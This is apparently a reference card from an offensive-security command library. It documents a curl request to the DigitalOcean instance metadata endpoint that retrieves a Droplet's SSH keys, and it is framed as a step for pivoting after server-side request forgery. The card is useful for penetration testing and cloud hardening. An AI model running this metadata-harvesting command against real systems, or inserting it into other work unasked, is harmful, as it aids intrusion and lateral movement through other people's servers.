---
id: 15d0abe9-c5d0-4394-981e-0e5fd8f1700d
type: command
executor: bash
data: >-
  curl -H 'Metadata-Flavor: DigitalOcean'
  http://169.254.169.254/metadata/v1/ssh-keys
output: null
created_at: '2023-04-06T03:56:38.436627+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - DigitalOcean
  - Linux
tags:
  - ssrf
  - metadata
  - ssh
verified: true
validated: true
---

# curl-do-ssh-keys

## Command

```bash
curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1/ssh-keys
```

## Description

Extracts SSH public keys associated with the DigitalOcean Droplet. Enables pivoting via SSH in SSRF scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H 'Metadata-Flavor: DigitalOcean' | Required for metadata access | Yes |

## Examples

### Basic Usage

```bash
curl -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1/ssh-keys
```

## Expected Output

ssh-rsa AAAAB3NzaC1yc2E... user@example.com

## Related

- [[procedures/Exploit-SSRF-to-Access-Cloud-Metadata]]
